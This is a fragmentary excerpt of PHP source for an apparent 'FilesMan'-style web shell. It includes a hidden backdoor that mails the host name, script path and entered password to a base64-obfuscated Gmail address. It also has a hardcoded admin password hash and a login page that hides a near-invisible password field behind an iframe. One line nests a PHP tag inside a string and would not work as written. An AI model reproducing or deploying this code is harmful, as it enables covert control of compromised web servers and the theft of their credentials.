...
if(array_key_exists('watching',$_POST)){
	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail(base64_decode("a2FwYW53ZG55YWJjYXN1QGdtYWlsLmNvbQ=="), 'root', $tmp); // Edit or delete!
}
//-----------------Password---------------------
$▛ = "9128c33d5ab78a6260ab97dbc6c210d6"; //admin
$▘ = true;
$▜ = 'UTF-8';
$▚ = 'FilesMan';
$asw = 'https://' . $_SERVER['HTTP_HOST'] . '/awduhgiawda';
...
function hardLogin() {
	...
	die("<iframe src='<?php echo $asw; ?>' width='100%' height='100%' frameborder='0'></iframe><pre align='center'><form method='post'><input style='margin:0;background-color:#fff;border:1px solid #fff' type='password' name='pass'></form></pre><style>input{margin:0;background-color:#fff;border:1px solid #fff}</style>");
}
